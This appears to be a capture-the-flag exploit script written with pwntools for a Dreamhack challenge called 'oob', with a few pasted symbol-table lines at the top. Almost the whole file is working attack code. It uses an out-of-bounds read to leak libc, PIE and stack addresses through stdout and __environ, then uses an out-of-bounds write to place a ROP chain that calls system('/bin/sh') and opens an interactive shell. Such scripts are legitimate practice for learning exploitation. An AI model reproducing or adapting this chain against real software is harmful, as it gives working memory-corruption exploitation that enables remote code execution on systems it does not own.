'''
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
/lib/x86_64-linux-gnu/libc.so.6
'''

'''
0000000000004010 D oob
000000000000401e B __bss_start
000000000000401e D _edata
0000000000004020 D __TMC_END__
0000000000004020 B stdout@GLIBC_2.2.5
0000000000004030 B stdin@GLIBC_2.2.5
0000000000004038 b completed.0
0000000000004040 B _end
'''

# oob + 0x10: stdout
# GOT(global offset table): 0x3f90
# oob: 0x4010
# dist: 0x80:(128)

from pwn import *

context.binary = elf = ELF('./oob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 21370".split()

libc = elf.libc

def slog(n, a): return success(': '.join([n, hex(a)]))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
else:
    p = process()

def read(offset):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'offset: ', str(offset).encode())

def write(offset, v):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'offset: ', str(offset).encode())
    p.sendlineafter(b'value: ', str(v).encode())

def leak(offset):
    l = 0
    for i in range(8):
        read(offset+i)
        out = p.recvline().strip()
        byte = 0 if not out else out[0]

        l |= (byte << (8 * i))
    
    return l

stdout = 0
stdout = leak(16)

got = 0
got = leak(-128)
lb = stdout - libc.sym["_IO_2_1_stdout_"]

oob = 0
oob = leak(-8) + 0x8
pie_base = oob - 0x4010

system = lb + libc.sym["system"]
environ = lb + libc.sym["__environ"]

slog("stdout", stdout)
slog("libc_base", lb)
slog("GOT", got)
slog("oob", oob)
slog("pie_base", pie_base)
slog("environ", environ)

# environ2ret
dist = environ - oob

stack = leak(dist)
slog("stack", stack)

ret = stack - 288
slog("ret", ret)

oob2ret = ret - oob
slog("oob2ret", oob2ret)

# gdb.attach(p)
# pause()

rop = ROP(libc)
pop_rdi = lb + rop.find_gadget(["pop rdi", "ret"])[0]
binsh = lb + next(libc.search(b'/bin/sh\x00'))
system = lb + libc.sym["system"]
ret_g = lb + rop.find_gadget(["ret"])[0]

write(oob2ret, pop_rdi)
write(oob2ret+0x8, binsh)
write(oob2ret+0x10, ret_g)
write(oob2ret+0x18, system)

p.interactive()